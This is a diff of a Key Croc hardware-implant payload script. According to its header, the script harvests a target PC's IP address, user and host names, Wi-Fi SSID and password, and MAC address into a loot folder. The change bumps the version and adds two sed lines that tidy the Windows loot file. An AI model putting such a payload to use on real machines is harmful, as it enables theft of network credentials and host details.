@@ -3,7 +3,7 @@
 #                This will collect some data like (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to loot folder
 # Author:        Spywill
-# Version:       1.0.5
+# Version:       1.0.6
 # Category:      Key Croc
 #
 #
@@ -79,6 +79,8 @@ case $TARGET_OS in
            echo "$TARGET_IP" >> ${CROC_OS}
            echo "$TARGET_HOSTNAME" >> ${CROC_OS}
            echo "$HOST_IP" >> ${CROC_OS}
+           $(sed -i 's/\r//g' /root/udisk/loot/Croc_OS_wind.txt)
+           $(sed -i '0,/./s/^.//' /root/udisk/loot/Croc_OS_wind.txt)
            Q STRING "/root/udisk/tools/Croc_Pot.sh"
            Q ENTER;;
       LINUX)
